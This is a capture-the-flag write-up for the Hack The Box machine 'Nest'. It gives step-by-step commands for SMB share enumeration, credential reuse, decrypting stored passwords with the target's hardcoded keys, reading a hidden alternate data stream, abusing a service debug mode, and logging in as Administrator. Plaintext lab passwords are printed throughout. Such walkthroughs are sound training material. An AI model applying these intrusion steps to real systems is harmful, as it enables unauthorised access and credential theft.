
##Summary

Nest is a easy windows machine with ip ```10.10.10.178```
Let's get start!



#Enumeration-Nmap
```
root@strike:~# nmap -sC -sV 10.10.10.178
Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-27 16:51 EET
Nmap scan report for 10.10.10.178
Host is up (0.073s latency).
Not shown: 999 filtered ports
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Host script results:
|_clock-skew: mean: 4m59s, deviation: 0s, median: 4m59s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-05-27 16:57:14
|_  start_date: 2020-05-27 15:09:41

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.08 seconds
root@strike:~#
```
As we can see port TCP/445 is open, So we can take a look for what shares are available...

```
root@strike:~# smbclient -L \\\\10.10.10.178
WARNING: The "encrypt passwords" option is deprecated
Unknown parameter encountered: "winbind trusted domains only"
Ignoring unknown parameter "winbind trusted domains only"
WARNING: The "null passwords" option is deprecated
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Data            Disk      
	IPC$            IPC       Remote IPC
	Secure$         Disk      
	Users           Disk      
SMB1 disabled -- no workgroup available
root@strike:~#
```
The Data share seems to be accessible anonymously
```
root@strike:~# smbclient  \\\\10.10.10.178\\Data
WARNING: The "encrypt passwords" option is deprecated
Unknown parameter encountered: "winbind trusted domains only"
Ignoring unknown parameter "winbind trusted domains only"
WARNING: The "null passwords" option is deprecated
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> ls
  .                                   D        0  Thu Aug  8 00:53:46 2019
  ..                                  D        0  Thu Aug  8 00:53:46 2019
  IT                                  D        0  Thu Aug  8 00:58:07 2019
  Production                          D        0  Mon Aug  5 23:53:38 2019
  Reports                             D        0  Mon Aug  5 23:53:44 2019
  Shared                              D        0  Wed Aug  7 21:07:51 2019

\IT
NT_STATUS_ACCESS_DENIED listing \IT\*

\Production
NT_STATUS_ACCESS_DENIED listing \Production\*

\Reports
NT_STATUS_ACCESS_DENIED listing \Reports\*

\Shared
  .                                   D        0  Wed Aug  7 21:07:51 2019
  ..                                  D        0  Wed Aug  7 21:07:51 2019
  Maintenance                         D        0  Wed Aug  7 21:07:32 2019
  Templates                           D        0  Wed Aug  7 21:08:07 2019

\Shared\Maintenance
  .                                   D        0  Wed Aug  7 21:07:32 2019
  ..                                  D        0  Wed Aug  7 21:07:32 2019
  Maintenance Alerts.txt              A       48  Tue Aug  6 01:01:44 2019

\Shared\Templates
  .                                   D        0  Wed Aug  7 21:08:07 2019
  ..                                  D        0  Wed Aug  7 21:08:07 2019
  HR                                  D        0  Wed Aug  7 21:08:01 2019
  Marketing                           D        0  Wed Aug  7 21:08:06 2019

\Shared\Templates\HR
  .                                   D        0  Wed Aug  7 21:08:01 2019
  ..                                  D        0  Wed Aug  7 21:08:01 2019
  Welcome Email.txt                   A      425  Thu Aug  8 00:55:36 2019

\Shared\Templates\Marketing
  .                                   D        0  Wed Aug  7 21:08:06 2019
  ..                                  D        0  Wed Aug  7 21:08:06 2019
smb: \> 
```
Now we can see two interesting files ```Maintenance Alerts.txt``` , ```Welcome Email.txt``` ,So let's retrive them...
```
root@strike:~# smbclient  \\\\10.10.10.178\\Data
WARNING: The "encrypt passwords" option is deprecated
Unknown parameter encountered: "winbind trusted domains only"
Ignoring unknown parameter "winbind trusted domains only"
WARNING: The "null passwords" option is deprecated
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> cd Shared\Templates\HR\
smb: \Shared\Templates\HR\> ls
  .                                   D        0  Wed Aug  7 21:08:01 2019
  ..                                  D        0  Wed Aug  7 21:08:01 2019
  Welcome Email.txt                   A      425  Thu Aug  8 00:55:36 2019

		10485247 blocks of size 4096. 6545678 blocks available
smb: \Shared\Templates\HR\> mget "Welcome Email.txt"
Get file Welcome Email.txt? y
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)
smb: \Shared\Templates\HR\> cd ../../Maintenance\
smb: \Shared\Maintenance\> mget "Maintenance Alerts.txt"
Get file Maintenance Alerts.txt? 
smb: \Shared\Maintenance\> mget "Maintenance Alerts.txt"
Get file Maintenance Alerts.txt? y
getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0.2 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \Shared\Maintenance\>
```
Let's ```cat``` file to see if there is anything interestion...

```
cat Maintenance\ Alerts.txt
There is currently no scheduled maintenance work%                                                                  ❯ cat Welcome\ Email.txt
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019

Thank you
```
Find username ```TempUser``` and password ```welcome2019```, Let's get access

```
root@strike:~# smbclient  \\\\10.10.10.178\\Data -U TempUser
WARNING: The "encrypt passwords" option is deprecated
Unknown parameter encountered: "winbind trusted domains only"
Ignoring unknown parameter "winbind trusted domains only"
WARNING: The "null passwords" option is deprecated
Enter WORKGROUP\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> ls
  .                                   D        0  Thu Aug  8 00:53:46 2019
  ..                                  D        0  Thu Aug  8 00:53:46 2019
  IT                                  D        0  Thu Aug  8 00:58:07 2019
  Production                          D        0  Mon Aug  5 23:53:38 2019
  Reports                             D        0  Mon Aug  5 23:53:44 2019
  Shared                              D        0  Wed Aug  7 21:07:51 2019

\IT
  .                                   D        0  Thu Aug  8 00:58:07 2019
  ..                                  D        0  Thu Aug  8 00:58:07 2019
  Archive                             D        0  Tue Aug  6 00:33:58 2019
  Configs                             D        0  Thu Aug  8 00:59:34 2019
  Installs                            D        0  Thu Aug  8 00:08:30 2019
  Reports                             D        0  Sun Jan 26 02:09:13 2020
  Tools                               D        0  Tue Aug  6 00:33:43 2019

\Production
  .                                   D        0  Mon Aug  5 23:53:38 2019
  ..                                  D        0  Mon Aug  5 23:53:38 2019

\Reports
  .                                   D        0  Mon Aug  5 23:53:44 2019
  ..                                  D        0  Mon Aug  5 23:53:44 2019

\Shared
  .                                   D        0  Wed Aug  7 21:07:51 2019
  ..                                  D        0  Wed Aug  7 21:07:51 2019
  Maintenance                         D        0  Wed Aug  7 21:07:32 2019
  Templates                           D        0  Wed Aug  7 21:08:07 2019

\IT\Archive
  .                                   D        0  Tue Aug  6 00:33:58 2019
  ..                                  D        0  Tue Aug  6 00:33:58 2019

\IT\Configs
  .                                   D        0  Thu Aug  8 00:59:34 2019
  ..                                  D        0  Thu Aug  8 00:59:34 2019
  Adobe                               D        0  Wed Aug  7 21:20:09 2019
  Atlas                               D        0  Tue Aug  6 13:16:18 2019
  DLink                               D        0  Tue Aug  6 15:25:27 2019
  Microsoft                           D        0  Wed Aug  7 21:23:26 2019
  NotepadPlusPlus                     D        0  Wed Aug  7 21:31:37 2019
  RU Scanner                          D        0  Wed Aug  7 22:01:13 2019
  Server Manager                      D        0  Tue Aug  6 15:25:19 2019

\IT\Installs
  .                                   D        0  Thu Aug  8 00:08:30 2019
  ..                                  D        0  Thu Aug  8 00:08:30 2019

\IT\Reports
  .                                   D        0  Sun Jan 26 02:09:13 2020
  ..                                  D        0  Sun Jan 26 02:09:13 2020

\IT\Tools
  .                                   D        0  Tue Aug  6 00:33:43 2019
  ..                                  D        0  Tue Aug  6 00:33:43 2019

\Shared\Maintenance
  .                                   D        0  Wed Aug  7 21:07:32 2019
  ..                                  D        0  Wed Aug  7 21:07:32 2019
  Maintenance Alerts.txt              A       48  Tue Aug  6 01:01:44 2019

\Shared\Templates
  .                                   D        0  Wed Aug  7 21:08:07 2019
  ..                                  D        0  Wed Aug  7 21:08:07 2019
  HR                                  D        0  Wed Aug  7 21:08:01 2019
  Marketing                           D        0  Wed Aug  7 21:08:06 2019

\IT\Configs\Adobe
  .                                   D        0  Wed Aug  7 21:20:09 2019
  ..                                  D        0  Wed Aug  7 21:20:09 2019
  editing.xml                        AH      246  Sat Aug  3 14:58:42 2019
  Options.txt                         A        0  Mon Oct 10 23:11:14 2011
  projects.xml                        A      258  Tue Jan  8 18:30:52 2013
  settings.xml                        A     1274  Wed Aug  7 21:19:12 2019

\IT\Configs\Atlas
  .                                   D        0  Tue Aug  6 13:16:18 2019
  ..                                  D        0  Tue Aug  6 13:16:18 2019
  Temp.XML                            A     1369  Wed Jun 11 10:38:22 2003

\IT\Configs\DLink
  .                                   D        0  Tue Aug  6 15:25:27 2019
  ..                                  D        0  Tue Aug  6 15:25:27 2019

\IT\Configs\Microsoft
  .                                   D        0  Wed Aug  7 21:23:26 2019
  ..                                  D        0  Wed Aug  7 21:23:26 2019
  Options.xml                         A     4598  Sat Mar  3 21:24:24 2012

\IT\Configs\NotepadPlusPlus
  .                                   D        0  Wed Aug  7 21:31:37 2019
  ..                                  D        0  Wed Aug  7 21:31:37 2019
  config.xml                          A     6451  Thu Aug  8 01:01:25 2019
  shortcuts.xml                       A     2108  Wed Aug  7 21:30:27 2019

\IT\Configs\RU Scanner
  .                                   D        0  Wed Aug  7 22:01:13 2019
  ..                                  D        0  Wed Aug  7 22:01:13 2019
  RU_config.xml                       A      270  Thu Aug  8 21:49:37 2019

\IT\Configs\Server Manager
  .                                   D        0  Tue Aug  6 15:25:19 2019
  ..                                  D        0  Tue Aug  6 15:25:19 2019

\Shared\Templates\HR
  .                                   D        0  Wed Aug  7 21:08:01 2019
  ..                                  D        0  Wed Aug  7 21:08:01 2019
  Welcome Email.txt                   A      425  Thu Aug  8 00:55:36 2019

\Shared\Templates\Marketing
  .                                   D        0  Wed Aug  7 21:08:06 2019
  ..                                  D        0  Wed Aug  7 21:08:06 2019

		10485247 blocks of size 4096. 6545678 blocks available
smb: \>
```
We ahve access to files in IT directory!

```
root@strike:~# smbget -R  smb://10.10.10.178/Data/ -U TempUser
Unknown parameter encountered: "winbind trusted domains only"
Ignoring unknown parameter "winbind trusted domains only"
Password for [TempUser] connecting to //Data/10.10.10.178: 
Using workgroup WORKGROUP, user TempUser
smb://10.10.10.178/Data//IT/Configs/Adobe/editing.xml                                                              
smb://10.10.10.178/Data//IT/Configs/Adobe/Options.txt                                                              
smb://10.10.10.178/Data//IT/Configs/Adobe/projects.xml                                                             
smb://10.10.10.178/Data//IT/Configs/Adobe/settings.xml                                                             
smb://10.10.10.178/Data//IT/Configs/Atlas/Temp.XML                                                                 
smb://10.10.10.178/Data//IT/Configs/Microsoft/Options.xml                                                          
smb://10.10.10.178/Data//IT/Configs/NotepadPlusPlus/config.xml                                                     
smb://10.10.10.178/Data//IT/Configs/NotepadPlusPlus/shortcuts.xml                                                  
smb://10.10.10.178/Data//IT/Configs/RU Scanner/RU_config.xml                                                       
smb://10.10.10.178/Data//Shared/Maintenance/Maintenance Alerts.txt                                                 
smb://10.10.10.178/Data//Shared/Templates/HR/Welcome Email.txt                                                     
Downloaded 16.65kB in 10 seconds
root@strike:~#
```
In RU_Config.xml:
```
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile>
```
This password is encrypted...After some search find some source code written in Visual Basic, So let's recursively download the ```Secure$\IT\Carl``` by ```smbget```

```
root@strike:~# smbget -rR smb://10.10.10.178/Secure$/IT/Carl/ -U TempUser
Unknown parameter encountered: "winbind trusted domains only"
Ignoring unknown parameter "winbind trusted domains only"
Password for [TempUser] connecting to //Secure$/10.10.10.178: 
Using workgroup WORKGROUP, user TempUser
smb://10.10.10.178/Secure$/IT/Carl//Docs/ip.txt                                 
smb://10.10.10.178/Secure$/IT/Carl//Docs/mmc.txt                                
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/ConfigFile.vb  
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/Module1.vb     
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Application.Designer.vb
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Application.myapp
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/AssemblyInfo.vb
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Resources.Designer.vb
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Resources.resx
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Settings.Designer.vb
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Settings.settings
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj.user
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/SsoIntegration.vb
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/Utils.vb       
smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner.sln            
Downloaded 25.18kB in 18 seconds
root@strike:~# 
```
Now finding interesting code in ```Model1.vb``` and ```Utils.vb```, Accoil this code together and Run:
```
Imports System.Text
Imports System.Security.Cryptography
Public Class Utils
	Public Class ConfigFile
    Public Property Port As Integer
    Public Property Username As String
    Public Property Password As String

    Public Sub SaveToFile(Path As String)
						Using File As New System.IO.FileStream(Path, System.IO.FileMode.Create)
            Dim Writer As New System.Xml.Serialization.XmlSerializer(GetType(ConfigFile))
            Writer.Serialize(File, Me)
        End Using
    End Sub

    Public Shared Function LoadFromFile(ByVal FilePath As String) As ConfigFile
        Using File As New System.IO.FileStream(FilePath, System.IO.FileMode.Open)
            Dim Reader As New System.Xml.Serialization.XmlSerializer(GetType(ConfigFile))
            Return DirectCast(Reader.Deserialize(File), ConfigFile)
        End Using
    End Function
  
End Class
    Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function Decrypt(ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String
        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)
        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)
        Dim cipherTextBytes As Byte()
		cipherTextBytes = System.Convert.FromBase64String(cipherText)
        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)
        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))
        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC
        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)
				Dim memoryStream As System.IO.MemoryStream
				memoryStream = New System.IO.MemoryStream(cipherTextBytes)
        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)
        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)
        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)
        memoryStream.Close()
        cryptoStream.Close()
        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)
	System.Console.WriteLine(plainText)
	Return plainText
    End Function

Public Class SsoIntegration
    Public Property Username As String
    Public Property Password As String
End Class
    
    Sub Main()
		Dim test As New SsoIntegration With {.Username = "c.smith", .Password = Utils.DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=")}
    End Sub
End Class
```
Give us username ```c.smith``` and passwd ```xRxRxPANCAK3SxRxRx```, Let's connect:
```
root@strike:~# smbclient  \\\\10.10.10.178\\Users -U C.Smith
WARNING: The "encrypt passwords" option is deprecated
Unknown parameter encountered: "winbind trusted domains only"
Ignoring unknown parameter "winbind trusted domains only"
WARNING: The "null passwords" option is deprecated
Enter WORKGROUP\C.Smith's password: 
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> ls
  .                                   D        0  Sun Jan 26 01:04:21 2020
  ..                                  D        0  Sun Jan 26 01:04:21 2020
  Administrator                       D        0  Fri Aug  9 17:08:23 2019
  C.Smith                             D        0  Sun Jan 26 09:21:44 2020
  L.Frost                             D        0  Thu Aug  8 19:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 19:02:50 2019
  TempUser                            D        0  Thu Aug  8 00:55:56 2019

\Administrator
NT_STATUS_ACCESS_DENIED listing \Administrator\*

\C.Smith
  .                                   D        0  Sun Jan 26 09:21:44 2020
  ..                                  D        0  Sun Jan 26 09:21:44 2020
  HQK Reporting                       D        0  Fri Aug  9 01:06:17 2019
  user.txt                            A       32  Fri Aug  9 01:05:24 2019

\L.Frost
NT_STATUS_ACCESS_DENIED listing \L.Frost\*

\R.Thompson
NT_STATUS_ACCESS_DENIED listing \R.Thompson\*

\TempUser
NT_STATUS_ACCESS_DENIED listing \TempUser\*

\C.Smith\HQK Reporting
  .                                   D        0  Fri Aug  9 01:06:17 2019
  ..                                  D        0  Fri Aug  9 01:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 14:18:42 2019
  Debug Mode Password.txt             A        0  Fri Aug  9 01:08:17 2019
  HQK_Config_Backup.xml               A      249  Fri Aug  9 01:09:05 2019

\C.Smith\HQK Reporting\AD Integration Module
  .                                   D        0  Fri Aug  9 14:18:42 2019
  ..                                  D        0  Fri Aug  9 14:18:42 2019
  HqkLdap.exe                         A    17408  Thu Aug  8 01:41:16 2019
smb: \> cd c.smith
smb: \C.Smith\> get user.txt 
getting file \C.Smith\user.txt of size 32 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```
Congrats!, Getting ```user.txt``` flag, Now we need to Privilege to root permission:

# Privilege Escalation

We can take a look on the ```Debug Mode Password.txt``` file and thought this could be used to authenticate to the DEBUG mode of the “HQK Reporting Service v1.2” running on port ```4386```
```
smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 07:06:12 PM 2019 EDT
access_time:    Thu Aug  8 07:06:12 PM 2019 EDT
write_time:     Thu Aug  8 07:08:17 PM 2019 EDT
change_time:    Thu Aug  8 07:08:17 PM 2019 EDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes

cat Debug\ Mode\ Password.txt:Password
WBQ201953D8w
```
Can use this passwd ```WBQ201953D8w``` to run ```SHOWQUERY``` command on the HQK Reporting Service
```
root@strike:~# telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>DEBUG WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
>setdir ..

Current directory set to HQK
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK
>setdir LDAP

Current directory set to LDAP
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: LDAP
>showquery 2    

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=

>
```
Now finding username ```Administrator``` and passwd is encrypted:

```HqKLdap.exe``` turns out that the binary will use the first supplied argument and attempt to extract the domain, username, and password information in order to make an LDAP search. I patched the Main function of the binary to remove the check for presence of ```HqkDbImport.exe``` and then to print the decrypted password to the console

After run the code passwd is ```XtH4nkS4Pl4y1nGX```, So let's get access:
```
root@strike:~# smbclient \\\\10.10.10.178\\c$ -U Administrator
WARNING: The "encrypt passwords" option is deprecated
Unknown parameter encountered: "winbind trusted domains only"
Ignoring unknown parameter "winbind trusted domains only"
WARNING: The "null passwords" option is deprecated
Enter WORKGROUP\Administrator's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Tue Jul 14 05:34:39 2009
  Boot                              DHS        0  Sat Jan 25 23:15:35 2020
  bootmgr                          AHSR   383786  Sat Nov 20 06:40:08 2010
  BOOTSECT.BAK                     AHSR     8192  Tue Aug  6 07:16:26 2019
  Config.Msi                        DHS        0  Sat Jan 25 23:49:12 2020
  Documents and Settings            DHS        0  Tue Jul 14 08:06:44 2009
  pagefile.sys                      AHS 2146881536  Wed May 27 15:09:38 2020
  PerfLogs                            D        0  Tue Jul 14 06:20:08 2009
  Program Files                      DR        0  Thu Aug  8 01:40:50 2019
  Program Files (x86)                DR        0  Tue Jul 14 08:06:53 2009
  ProgramData                        DH        0  Mon Aug  5 22:24:41 2019
  Recovery                          DHS        0  Mon Aug  5 22:22:25 2019
  restartsvc.bat                      A       33  Thu Aug  8 01:43:09 2019
  Shares                              D        0  Tue Aug  6 15:59:55 2019
  System Volume Information         DHS        0  Tue Aug  6 06:17:38 2019
  Users                              DR        0  Thu Aug  8 19:19:40 2019
  Windows                             D        0  Sat Jan 25 23:22:42 2020

		10485247 blocks of size 4096. 6545685 blocks available
smb: \> cd Users\Administrator\Desktop\
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Sun Jan 26 09:20:50 2020
  ..                                 DR        0  Sun Jan 26 09:20:50 2020
  desktop.ini                       AHS      282  Sun Jan 26 00:02:44 2020
  root.txt                            A       32  Tue Aug  6 00:27:26 2019

		10485247 blocks of size 4096. 6545685 blocks available
smb: \Users\Administrator\Desktop\> get root.txt
getting file \Users\Administrator\Desktop\root.txt of size 32 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \Users\Administrator\Desktop\>
```
Congrats! root.txt 
